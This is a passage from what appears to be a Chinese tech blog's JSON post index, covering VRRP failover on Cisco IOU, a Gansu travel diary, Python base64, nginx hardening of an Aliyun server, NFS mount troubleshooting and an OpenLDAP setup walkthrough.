21:50:24.143: %VRRP-6-STATECHANGE: Et0/1 Grp 1 state Init -&gt; Backup *Jul 3 21:50:24.148: %VRRP-6-STATECHANGE: Et0/1 Grp 1 state Init -&gt; Backup2.配置优先级 IOU2(config-if)#vrrp 1 priority 2543.查看 vrrp 信息 IOU2(config)#do sh vrrp all Ethernet0/1 - Group 1 State is Master Virtual IP address is 10.1.100.20 Virtual MAC address is 0000.5e00.0101 Advertisement interval is 1.000 sec Preemption enabled Priority is 254 Master Router is 10.1.100.22 (local), priority is 254 Master Advertisement interval is 1.000 sec Master Down interval is 3.007 sec IOU3(config)#do show vrrp all Ethernet0/1 - Group 1 State is Backup Virtual IP address is 10.1.100.20 Virtual MAC address is 0000.5e00.0101 Advertisement interval is 1.000 sec Preemption enabled Priority is 100 Master Router is 10.1.100.22, priority is 254 Master Advertisement interval is 1.000 sec Master Down interval is 3.609 sec (expires in 2.909 sec)查看状态 IOU2(config)#do sh vrrp brief Interface Grp Pri Time Own Pre State Master addr Group addr Et0/1 1 254 3007 Y Master 10.1.100.22 10.1.100.20 IOU3#sh vrrp brief Interface Grp Pri Time Own Pre State Master addr Group addr Et0/1 1 100 3609 Y Backup 10.1.100.22 10.1.100.20断开 master 接口 IOU2(config-if)#shutdown发现备用路由器已经成为master 了 IOU3# *Jul 3 21:56:24.916: %VRRP-6-STATECHANGE: Et0/1 Grp 1 state Backup -&gt; Master端口后端口状态会由 master 变为 init IOU2(config-if)#do sh vrrp br Interface Grp Pri Time Own Pre State Master addr Group addr Et0/1 1 254 3007 Y Init 0.0.0.0 10.1.100.20如果恢复后，会先进入 backup 状态，然后根据优先级选举，优先级高的成为 master IOU2(config-if)#do sh vrrp br Interface Grp Pri Time Own Pre State Master addr Group addr Et0/1 1 254 3007 Y Init 0.0.0.0 10.1.100.20 IOU2(config-if)#no sh IOU2(config-if)#do sh vrrp br Interface Grp Pri Time Own Pre State Master addr Group addr Et0/1 1 254 3007 Y Backup 0.0.0.0 10.1.100.20 IOU2(config-if)# *Jul 3 21:59:18.645: %VRRP-6-STATECHANGE: Et0/1 Grp 1 state Init -&gt; Backup IOU2(config-if)#do sh vrrp br Interface Grp Pri Time Own Pre State Master addr Group addr Et0/1 1 254 3007 Y Backup 0.0.0.0 10.1.100.20 IOU2(config-if)#do sh vrrp br Interface Grp Pri Time Own Pre State Master addr Group addr Et0/1 1 254 3007 Y Backup 0.0.0.0 10.1.100.20 IOU2(config-if)#do sh vrrp br *Jul 3 21:59:20.649: %LINK-3-UPDOWN: Interface Ethernet0/1, changed state to up *Jul 3 21:59:21.655: %LINEPROTO-5-UPDOWN: Line protocol on Interface Ethernet0/1, changed state to up *Jul 3 21:59:21.655: %VRRP-6-STATECHANGE: Et0/1 Grp 1 state Backup -&gt; Master IOU2(config-if)#do sh vrrp br Interface Grp Pri Time Own Pre State Master addr Group addr Et0/1 1 254 3007 Y Master 10.1.100.22 10.1.100.20","categories":[],"tags":[{"name":"VRRP","slug":"VRRP","permalink":"https://awen.me/tags/VRRP/"}]},{"title":"西北三日游","slug":"西北三日游","date":"2017-06-01T02:48:41.000Z","updated":"2021-02-26T06:05:29.355Z","comments":true,"path":"posts/40563.html","link":"","permalink":"https://awen.me/posts/40563.html","excerpt":"端午节去了我长这么大跑的最远的地方—甘肃民勤，这个地方四周都是沙漠包围着。在过去就是张掖、酒泉、嘉峪关了，不过据说过去还要1天时间。 从杭州萧山机场到兰州要2个多小时，到达甘肃兰州的第二天，驱车去民勤的路上在窗外看见了雪山，那就是祁连山，第一次在这6月的天气看见雪山。","text":"端午节去了我长这么大跑的最远的地方—甘肃民勤，这个地方四周都是沙漠包围着。在过去就是张掖、酒泉、嘉峪关了，不过据说过去还要1天时间。 从杭州萧山机场到兰州要2个多小时，到达甘肃兰州的第二天，驱车去民勤的路上在窗外看见了雪山，那就是祁连山，第一次在这6月的天气看见雪山。 民勤是一片沙漠化非常严重的绿洲，早在2007年，国家总理温家宝就考察甘肃民勤时说过，绝对不能让民勤称为第二个罗布泊。 这里严重缺水，周围的居民都是用塑料桶装着供应的水日常使用，我这个南方人，即使在老家每天可以使用山泉水、自来水（我老家自己造的水池接山泉水，特别甜），从来没有担心有一天会没有水喝，看到这样的画面才能体会水对于当地居民的不易。 当地虽然也是使用北京时间，但是5月底，早上4点多天就亮了，晚上9点太阳才下山，南方下午7点就天黑了。虽然太阳很大，但是不像南方晒着太阳就出汗。 我吃不惯当地的食物、因为当地都是吃面食。我们南方都是吃米，偶尔吃面的表示不太习惯。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"python base64编解码","slug":"python-base64编解码","date":"2017-05-25T04:30:49.000Z","updated":"2021-02-26T06:05:29.281Z","comments":true,"path":"posts/39973.html","link":"","permalink":"https://awen.me/posts/39973.html","excerpt":"Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由2的6次方等于64，所以每6个比特为一个单元，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节可表示4个可打印字符。它可用来作为电子邮件的传输编码。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。","text":"Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由2的6次方等于64，所以每6个比特为一个单元，对应某个可打印字符。三个字节有24个比特，对应于4个Base64单元，即3个字节可表示4个可打印字符。它可用来作为电子邮件的传输编码。在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。 代码#!/usr/bin/env python #-*-coding:utf-8-*- import base64 s = &quot;我哈&quot; a = base64.b64encode(s) print(a) # 结果5oiR5ZOI b = base64.b64decode(a) print(b) # 结果我哈","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"阿里云 ECS 被攻击的处理记录","slug":"阿里云-ECS-被攻击的处理记录","date":"2017-05-22T01:42:22.000Z","updated":"2021-02-26T06:05:29.360Z","comments":true,"path":"posts/2148756081.html","link":"","permalink":"https://awen.me/posts/2148756081.html","excerpt":"登陆阿里云后台，发现阿里云的 web 防火墙显示有很多个 ip 对网站进行攻击 有GET POST请求的攻击。我们通过 nginx 日志去看下，比如61.136.155.18的访问次数，发现没有这个 ip 的访问记录。应该是直接被阿里云的防火墙拦截了。另外发现有很多 POST请求.","text":"登陆阿里云后台，发现阿里云的 web 防火墙显示有很多个 ip 对网站进行攻击 有GET POST请求的攻击。我们通过 nginx 日志去看下，比如61.136.155.18的访问次数，发现没有这个 ip 的访问记录。应该是直接被阿里云的防火墙拦截了。另外发现有很多 POST请求. 只允许特定的 HTTP 请求访问我用的是 hexo，没有 POST 请求，所以，可以直接在 NGINX 配置文件server段中加入 if ($request_method !~ ^(GET|HEAD)$ ) { return 444; } 因为博客全部都是静态页面，不需要 POST 请求，可以直接禁止，只允许 GET 和 HEAD 禁止 IP 直接访问另外的话，我不希望客户端直接通过 ip 访问，如果通过 ip 访问，会直接禁止 server { listen 80; server_name _; #加入这条 server_name www.fangwenjun.com fangwennjun.com awen.me www.awen.me; return 444; #返回444 if ($request_method !~ ^(GET|HEAD|POST)$ ) { return 444; } rewrite ^(.*)$ https://awen.me$1 permanent; //跳转到 HTTPS }配置 nginx 开启 SSLlisten 443 ssl http2; server_name awen.me www.awen.me; index index.html index.htm index.php; root /www/; ssl on; ssl_certificate /usr/local/nginx/ssl/awen/fullchain.cer; ssl_certificate_key /usr/local/nginx/ssl/awen/awen.me.key; ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5; ssl_prefer_server_ciphers on; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_session_cache shared:SSL:50m; ssl_session_timeout 1d; ssl_session_tickets on; resolver 114.114.114.114 valid=300s; resolver_timeout 10s; 配置 CDN使用又拍云 CDN 加速，并且在 CDN 配置 SSL 证书,开启 HSTS 功能。","categories":[],"tags":[{"name":"阿里云","slug":"阿里云","permalink":"https://awen.me/tags/%E9%98%BF%E9%87%8C%E4%BA%91/"},{"name":"攻击","slug":"攻击","permalink":"https://awen.me/tags/%E6%94%BB%E5%87%BB/"}]},{"title":"centos 7 ldap nfs 挂载失败，提示 No route to host 排查过程","slug":"centos-7-ldap-nfs-挂载失败，提示-No-route-to-host-排查过程","date":"2017-05-20T23:56:00.000Z","updated":"2021-02-26T06:05:29.269Z","comments":true,"path":"posts/1725994150.html","link":"","permalink":"https://awen.me/posts/1725994150.html","excerpt":"配置服务端 172.10.100.129客户端 172.10.100.133","text":"配置服务端 172.10.100.129客户端 172.10.100.133 报错[root@client ~]# vim /etc/exports [root@client ~]# mount -t nfs -v -o vers=3 172.10.100.129:/home/ldapuser /mnt/ mount.nfs: timeout set for Sun May 21 07:50:28 2017 mount.nfs: trying text-based options &apos;vers=3,addr=172.10.100.129&apos; mount.nfs: prog 100003, trying vers=3, prot=6 mount.nfs: portmap query failed: RPC: Remote system error - No route to host mount.nfs: trying text-based options &apos;vers=3,addr=172.10.100.129&apos; mount.nfs: prog 100003, trying vers=3, prot=6 mount.nfs: portmap query failed: RPC: Remote system error - No route to host mount.nfs: trying text-based options &apos;vers=3,addr=172.10.100.129&apos; mount.nfs: prog 100003, trying vers=3, prot=6 mount.nfs: portmap query failed: RPC: Remote system error - No route to host ^C [root@client ~]#首先，ping 没有问题，说明网络是通的 [root@client ~]# ping 172.10.100.129 PING 172.10.100.129 (172.10.100.129) 56(84) bytes of data. 64 bytes from 172.10.100.129: icmp_seq=1 ttl=64 time=14.7 ms 64 bytes from 172.10.100.129: icmp_seq=2 ttl=64 time=0.221 ms 64 bytes from 172.10.100.129: icmp_seq=3 ttl=64 time=0.153 ms 64 bytes from 172.10.100.129: icmp_seq=4 ttl=64 time=0.194 ms ^C --- 172.10.100.129 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3019ms rtt min/avg/max/mdev = 0.153/3.839/14.789/6.322 ms既然报路由错误，就查下路由表吧，也没问题 [root@client ~]# route -n Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 0.0.0.0 172.10.100.2 0.0.0.0 UG 100 0 0 ens34 0.0.0.0 172.10.100.2 0.0.0.0 UG 101 0 0 ens33 172.10.100.0 0.0.0.0 255.255.255.0 U 100 0 0 ens34 172.10.100.0 0.0.0.0 255.255.255.0 U 101 0 0 ens33 192.168.122.0 0.0.0.0 255.255.255.0 U 0 0 0 virbr0服务端自己挂载下 nfs，看看是否起的来，发现没有任何问题 [root@server ~]# exportfs -rv exporting *:/home/ldapuser [root@server ~]# clear [root@server ~]# mount -t nfs -v -o vers=3 172.10.100.129:/home/ldapuser /mnt/ mount.nfs: timeout set for Sun May 21 07:50:04 2017 mount.nfs: trying text-based options &apos;vers=3,addr=172.10.100.129&apos; mount.nfs: prog 100003, trying vers=3, prot=6 mount.nfs: trying 172.10.100.129 prog 100003 vers 3 prot TCP port 2049 mount.nfs: prog 100005, trying vers=3, prot=17 mount.nfs: trying 172.10.100.129 prog 100005 vers 3 prot UDP port 20048 [root@server ~]# cd /mnt/ [root@server mnt]# ls lduser1 lduser2 lduser3 lduser4 lduser5 lduser6服务端和客户端防火墙和 selinux 状态 [root@server mnt]# getenforce Disabled [root@server mnt]# systemctl status firewalld.service ● firewalld.service Loaded: masked (/dev/null; bad) Active: inactive (dead) [root@server mnt]#客户端 [root@client ~]# getenforce Disabled [root@client ~]# systemctl status firewalld.service ● firewalld.service - firewalld - dynamic firewall daemon Loaded: loaded (/usr/lib/systemd/system/firewalld.service; disabled; vendor preset: enabled) Active: inactive (dead) Docs: man:firewalld(1)服务端 nfs 重启 [root@server mnt]# systemctl status nfs-server.service ● nfs-server.service - NFS server and services Loaded: loaded (/usr/lib/systemd/system/nfs-server.service; enabled; vendor preset: disabled) Active: active (exited) since Sun 2017-05-21 07:44:12 CST; 9min ago Process: 3113 ExecStopPost=/usr/sbin/exportfs -f (code=exited, status=0/SUCCESS) Process: 3109 ExecStopPost=/usr/sbin/exportfs -au (code=exited, status=0/SUCCESS) Process: 3108 ExecStop=/usr/sbin/rpc.nfsd 0 (code=exited, status=0/SUCCESS) Process: 3125 ExecStart=/usr/sbin/rpc.nfsd $RPCNFSDARGS (code=exited, status=0/SUCCESS) Process: 3124 ExecStartPre=/usr/sbin/exportfs -r (code=exited, status=0/SUCCESS) Main PID: 3125 (code=exited, status=0/SUCCESS) CGroup: /system.slice/nfs-server.service May 21 07:44:12 server systemd[1]: Starting NFS server and services... May 21 07:44:12 server systemd[1]: Started NFS server and services.客户端 [root@client ~]# showmount -e 172.10.100.129 clnt_create: RPC: Port mapper failure - Unable to receive: errno 113 (No route to host) [root@client ~]# rpcinfo -p localhost program vers proto port service 100000 4 tcp 111 portmapper 100000 3 tcp 111 portmapper 100000 2 tcp 111 portmapper 100000 4 udp 111 portmapper 100000 3 udp 111 portmapper 100000 2 udp 111 portmapper 100024 1 udp 37925 status 100024 1 tcp 54522 status解决办法老子信了你的邪。现在可以确定服务端没问题，那么问题就在客户端，我要使用运维三大法宝了，重启、重装软件、重装系统，在装个系统模拟客户端试试。 2017年5月21日 11点17分记录 经过一上午的折腾 终于搞定了","categories":[],"tags":[{"name":"LDAP","slug":"LDAP","permalink":"https://awen.me/tags/LDAP/"},{"name":"NFS","slug":"NFS","permalink":"https://awen.me/tags/NFS/"}]},{"title":"centos 7 使用 ldap 服务","slug":"centos-7-使用-ldap-服务","date":"2017-05-20T06:24:00.000Z","updated":"2021-02-26T06:05:29.269Z","comments":true,"path":"posts/3734665596.html","link":"","permalink":"https://awen.me/posts/3734665596.html","excerpt":"前提关闭2台机器的 selinux 和防火墙 systemctl stop firewalld.service setenforce 0 [root@server ~]# sed -i s/^SELINUX=enforcing/SELINUX=disabled/g /etc/selinux/config","text":"前提关闭2台机器的 selinux 和防火墙 systemctl stop firewalld.service setenforce 0 [root@server ~]# sed -i s/^SELINUX=enforcing/SELINUX=disabled/g /etc/selinux/config 安装yum install openldap openldap-clients openldap-servers migrationtools配置文件 cd /etc/openldap/slapd.d拷贝配置文件到 home 目录 cp /usr/share/openldap-servers/slapd.ldif /home/修改 dc=my-doamin 为你的域名 dn: olcDatabase=monitor,cn=config objectClass: olcDatabaseConfig olcDatabase: monitor olcAccess: to * by dn.base=&quot;gidNumber=0+uidNumber=0,cn=peercred,cn=external,c n=auth&quot; read by dn.base=&quot;cn=Manager,dc=abc,dc=com&quot; read by * none设置一个密码 [root@server home]# slappasswd New password: Re-enter new password: {SSHA}6ZV4bJxlj6a0CPsqAwaXdS+AjPmSZ9Do把密码加入到配置文件 olcRootDN: cn=Manager,dc=abc,dc=com olcRootPW: {SSHA}6ZV4bJxlj6a0CPsqAwaXdS+AjPmSZ9Do #增加一行PW:后注意是 tab 键盘 不要留空格增加内容 include: file:///etc/openldap/schema/corba.ldif include: file:///etc/openldap/schema/core.ldif include: file:///etc/openldap/schema/cosine.ldif include: file:///etc/openldap/schema/duaconf.ldif include: file:///etc/openldap/schema/dyngroup.ldif include: file:///etc/openldap/schema/inetorgperson.ldif include: file:///etc/openldap/schema/java.ldif include: file:///etc/openldap/schema/misc.ldif include: file:///etc/openldap/schema/nis.ldif include: file:///etc/openldap/schema/openldap.ldif include: file:///etc/openldap/schema/ppolicy.ldif include: file:///etc/openldap/schema/collective.ldif我这边得到的结果是，注意删除重复的，否则后面会报49错误 [root@server /]# cat /home/slapd.ldif # # See slapd-config(5) for details on configuration options. # This file should NOT be world readable. # dn: cn=config objectClass: olcGlobal cn: config olcArgsFile: /var/run/openldap/slapd.args olcPidFile: /var/run/openldap/slapd.pid # # TLS settings # olcTLSCACertificatePath: /etc/openldap/certs olcTLSCertificateFile: &quot;OpenLDAP Server&quot; olcTLSCertificateKeyFile: /etc/openldap/certs/password # # Do not enable referrals until AFTER you have a working directory # service AND an understanding of referrals. # #olcReferral: ldap://root.openldap.org # # Sample security restrictions # Require integrity protection (prevent hijacking) # Require 112-bit (3DES or better) encryption for updates # Require 64-bit encryption for simple bind # #olcSecurity: ssf=1 update_ssf=112 simple_bind=64 # # Load dynamic backend modules: # - modulepath is architecture dependent value (32/64-bit system) # - back_sql.la backend requires openldap-servers-sql package # - dyngroup.la and dynlist.la cannot be used at the same time # #dn: cn=module,cn=config #objectClass: olcModuleList #cn: module #olcModulepath: /usr/lib/openldap #olcModulepath: /usr/lib64/openldap #olcModuleload: accesslog.la #olcModuleload: auditlog.la #olcModuleload: back_dnssrv.la #olcModuleload: back_ldap.la #olcModuleload: back_mdb.la #olcModuleload: back_meta.la #olcModuleload: back_null.la #olcModuleload: back_passwd.la #olcModuleload: back_relay.la #olcModuleload: back_shell.la #olcModuleload: back_sock.la #olcModuleload: collect.la #olcModuleload: constraint.la #olcModuleload: dds.la #olcModuleload: deref.la #olcModuleload: dyngroup.la #olcModuleload: dynlist.la #olcModuleload: memberof.la #olcModuleload: pcache.la #olcModuleload: ppolicy.la #olcModuleload: refint.la #olcModuleload: retcode.la #olcModuleload: rwm.la #olcModuleload: seqmod.la #olcModuleload: smbk5pwd.la #olcModuleload: sssvlv.la #olcModuleload: syncprov.la #olcModuleload: translucent.la #olcModuleload: unique.la #olcModuleload: valsort.la # # Schema settings # dn: cn=schema,cn=config objectClass: olcSchemaConfig cn: schema include: file:///etc/openldap/schema/corba.ldif include: file:///etc/openldap/schema/core.ldif include: file:///etc/openldap/schema/cosine.ldif include: file:///etc/openldap/schema/duaconf.ldif include: file:///etc/openldap/schema/dyngroup.ldif include: file:///etc/openldap/schema/inetorgperson.ldif include: file:///etc/openldap/schema/java.ldif include: file:///etc/openldap/schema/misc.ldif include: file:///etc/openldap/schema/nis.ldif include: file:///etc/openldap/schema/openldap.ldif include: file:///etc/openldap/schema/ppolicy.ldif include: file:///etc/openldap/schema/collective.ldif # # Frontend settings # dn: olcDatabase=frontend,cn=config objectClass: olcDatabaseConfig objectClass: olcFrontendConfig olcDatabase: frontend # # Sample global access control policy: # Root DSE: allow anyone to read it # Subschema (sub)entry DSE: allow anyone to read it # Other DSEs: # Allow self write access # Allow authenticated users read access # Allow anonymous users to authenticate # #olcAccess: to dn.base=&quot;&quot; by * read #olcAccess: to dn.base=&quot;cn=Subschema&quot; by * read #olcAccess: to * # by self write # by users read # by anonymous auth # # if no access controls are present, the default policy # allows anyone and everyone to read anything but restricts # updates to rootdn. (e.g., &quot;access to * by * read&quot;) # # rootdn can always read and write EVERYTHING! # # # Configuration database # dn: olcDatabase=config,cn=config objectClass: olcDatabaseConfig olcDatabase: config olcAccess: to * by dn.base=&quot;gidNumber=0+uidNumber=0,cn=peercred,cn=external,c n=auth&quot; manage by * none # # Server status monitoring # dn: olcDatabase=monitor,cn=config objectClass: olcDatabaseConfig olcDatabase: monitor olcAccess: to * by dn.base=&quot;gidNumber=0+uidNumber=0,cn=peercred,cn=external,c n=auth&quot; read by dn.base=&quot;cn=Manager,dc=abc,dc=com&quot; read by * none # # Backend database definitions # dn: olcDatabase=hdb,cn=config objectClass: olcDatabaseConfig objectClass: olcHdbConfig olcDatabase: hdb olcSuffix: dc=abc,dc=com olcRootDN: cn=Manager,dc=abc,dc=com olcRootPW: {SSHA}eO9asOoLigAQEaoCkAT+yG2A6B7+c5l5 olcDbDirectory: /var/lib/ldap olcDbIndex: objectClass eq,pres olcDbIndex: ou,cn,mail,surname,givenname eq,pres,sub olcDbIndex: uidNumber,gidNumber,loginShell eq,pres olcDbIndex: uid,memberUid eq,pres,sub olcDbIndex: nisMapName,nisMapEntry eq,pres,sub删除原有的配置 [root@server ~]# rm -rf /etc/openldap/slapd.d/*将 home 目录的slapd.ldif 加载进配置文件目录中 [root@server home]# slapadd -F /etc/openldap/slapd.d/ -n 0 -l /home/slapd.ldif 591fd54d str2entry: entry -1 has no dn slapadd: could not parse entry (line=724) _################### 99.70% eta none elapsed none spd 3.3 M/s Closing DB...上面这个是提示有错误的，正确的应该是下面这样 [root@server ~]# slapadd -F /etc/openldap/slapd.d/ -n 0 -l /home/slapd.ldif _#################### 100.00% eta none elapsed none fast! Closing DB... -l:说明了包含要增加的条目的文本格式的LDIF输入文件 -f:说明了slapd配置文件的格式。该配置文件说明了在何处创建索引，以及创建什么索引等等 -n:说明修改那一个数据库的可选参数 测试文件是否正确 [root@server home]# slaptest -u -F /etc/openldap/slapd.d/ config file testing succeeded若正确则提示： config file testing succeeded修改配置文件的所有者，否则无法读取这些配置： chown -Rv ldap.ldap /etc/openldap/slapd.d如下 [root@server slapd.d]# chown -Rv ldap.ldap /etc/openldap/slapd.d/ changed ownership of ‘/etc/openldap/slapd.d/cn=config.ldif’ from root:root to ldap:ldap changed ownership of ‘/etc/openldap/slapd.d/cn=config/cn=schema.ldif’ from root:root to ldap:ldap changed ownership of ‘/etc/openldap/slapd.d/cn=config/cn=schema/cn={0}core.ldif’ from root:root to ldap:ldap changed ownership of ‘/etc/openldap/slapd.d/cn=config/cn=schema/cn={1}collective.ldif’ from root:root to ldap:ldap changed ownership of ‘/etc/openldap/slapd.d/cn=config/cn=schema’ from root:root to ldap:ldap changed ownership of ‘/etc/openldap/slapd.d/cn=config’ from root:root to ldap:ldap ownership of ‘/etc/openldap/slapd.d/’ retained as ldap:ldap确认下所有者和所属组 [root@server slapd.d]# ll total 4 drwxr-x--- 3 ldap ldap 45 May 20 13:34 cn=config -rw------- 1 ldap ldap 589 May 20 13:34 cn=config.ldif创建数据库配置文件 [root@server slapd.d]# cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG [root@server slapd.d]# chown -Rv ldap.ldap /var/lib/ldap/DB_CONFIG changed ownership of ‘/var/lib/ldap/DB_CONFIG’ from root:root to ldap:ldap启动服务 [root@server ~]# systemctl start slapd.service [root@server ~]# systemctl status slapd.service [root@server ~]# systemctl enable slapd.service创建多个用户 [root@server ~]# ./create_user.sh mkdir: created directory ‘/home/ldapuser’ Changing password for user lduser1. passwd: all authentication tokens updated successfully. Changing password for user lduser2. passwd: all authentication tokens updated successfully. Changing password for user lduser3. passwd: all authentication tokens updated successfully. Changing password for user lduser4. passwd: all authentication tokens updated successfully. Changing password for user lduser5. passwd: all authentication tokens updated successfully. Changing password for user lduser6. passwd: all authentication tokens updated successfully.附脚本内容 [root@server ~]# cat create_user.sh #!/bin/bash USER_LIST=ldapuser.txt HOME_ldap=/home/ldapuser mkdir -pv $HOME_ldap for USERID in `awk &apos;{print $1}&apos; $USER_LIST`; do USERNAME=&quot;`grep &quot;$USERID&quot; $USER_LIST | awk &apos;{print $2}&apos;`&quot; HOMEDIR=${HOME_ldap}/${USERNAME} useradd $USERNAME -u $USERID -d $HOMEDIR grep &quot;$USERID&quot; $USER_LIST | awk &apos;{print $3}&apos; | passwd --stdin $USERNAME done [root@server ~]# cat ldapuser.txt 5000 lduser1 123456 5001 lduser2 123456 5002 lduser3 123456 5003 lduser4 123456 5004 lduser5 123456 5005 lduser6 123456 [root@server ~]#修改/usr/share/migrationtools/migrate_common.ph文件 vim /usr/share/migrationtools/migrate_common.ph # Default DNS domain $DEFAULT_MAIL_DOMAIN = &quot;abc.com&quot;; # Default base $DEFAULT_BASE = &quot;dc=abc,dc=com&quot;;创建基本的数据库模板文件 [root@server ~]# /usr/share/migrationtools/migrate_base.pl &gt; /root/base.ldif 创建用户的数据库模板文件 [root@server ~]# /usr/share/migrationtools/migrate_passwd.pl /etc/passwd /root/user.ldif编辑vim /root/user.ldif，只留下LDAP用户的相关信息，删掉其他用户信息(不删也没事)。 user.ldif中所有的DN都是属于People这个OU，而People这个OU是在base.ldif中定义的。user.ldif中所有的DN都是继承自以下4个类：objectClass: accountobjectClass: posixAccountobjectClass: topobjectClass: shadowAccount其中posixAccount和shadowAccount提供了uidNumber、gidNumber、homeDirectory、loginShell、userPassword这些属性 创建组数据库信息 [root@server ~]# /usr/share/migrationtools/migrate_group.pl /etc/group /root/group.ldif编辑group.ldif，只留LDAP用户相关的组的信息，删掉其他用户信息(不删也没事)。user.ldif中所有的DN都是属于Group这个OU，而Group这个OU是在base.ldif中定义的。 使用 ldapadd 导入数据库 在ldappadd命令中常用的选项如下：-x：进行简单认证。-D：用来绑定服务器的dn。-h：目录服务的地址。-w：绑定dn的密码。-f：使用LDIF文件进行条目添加的文件。 [root@server ~]# ldapadd -D &quot;cn=Manager,dc=abc,dc=com&quot; -W -x -f base.ldif Enter LDAP Password: ldap_bind: Invalid credentials (49) [root@server ~]# ldapadd -D &quot;cn=Manager,dc=abc,dc=com&quot; -W -x -f user.ldif Enter LDAP Password: ldap_bind: Invalid credentials (49) [root@server ~]# ldapadd -D &quot;cn=Manager,dc=abc,dc=com&quot; -W -x -f group.ldif Enter LDAP Password: ldap_bind: Invalid credentials (49)49 是语法错误,检查配置文件 正常的是如下 [root@adsl-172-10-100-129 ~]# ldapadd -D &quot;cn=Manager,dc=abc,dc=com&quot; -W -x -f base.ldif Enter LDAP Password: adding new entry &quot;dc=abc,dc=com&quot; adding new entry &quot;ou=Hosts,dc=abc,dc=com&quot; adding new entry &quot;ou=Rpc,dc=abc,dc=com&quot; adding new entry &quot;ou=Services,dc=abc,dc=com&quot; adding new entry &quot;nisMapName=netgroup.byuser,dc=abc,dc=com&quot; adding new entry &quot;ou=Mounts,dc=abc,dc=com&quot; adding new entry &quot;ou=Networks,dc=abc,dc=com&quot; adding new entry &quot;ou=People,dc=abc,dc=com&quot; adding new entry &quot;ou=Group,dc=abc,dc=com&quot; adding new entry &quot;ou=Netgroup,dc=abc,dc=com&quot; adding new entry &quot;ou=Protocols,dc=abc,dc=com&quot; adding new entry &quot;ou=Aliases,dc=abc,dc=com&quot; adding new entry &quot;nisMapName=netgroup.byhost,dc=abc,dc=com&quot; [root@adsl-172-10-100-129 ~]# ldapadd -D &quot;cn=Manager,dc=abc,dc=com&quot; -W -x -f group.ldif Enter LDAP Password: adding new entry &quot;cn=root,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=bin,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=daemon,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=sys,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=adm,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=tty,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=disk,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=lp,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=mem,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=kmem,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=wheel,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=cdrom,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=mail,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=man,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=dialout,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=floppy,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=games,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=tape,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=video,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=ftp,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=lock,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=audio,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=nobody,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=users,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=utmp,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=utempter,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=input,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=systemd-journal,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=systemd-bus-proxy,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=systemd-network,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=dbus,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=polkitd,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=abrt,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=unbound,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=tss,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=libstoragemgmt,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=rpc,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=colord,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=usbmuxd,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=cgred,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=dip,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=ssh_keys,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=saslauth,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=geoclue,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=libvirt,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=rtkit,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=radvd,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=rpcuser,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=nfsnobody,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=kvm,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=qemu,ou=Group,dc=abc,dc=com&quot; adding new entry &quot;cn=chrony,ou=Group,dc=abc,dc=com&quot; adding new entry 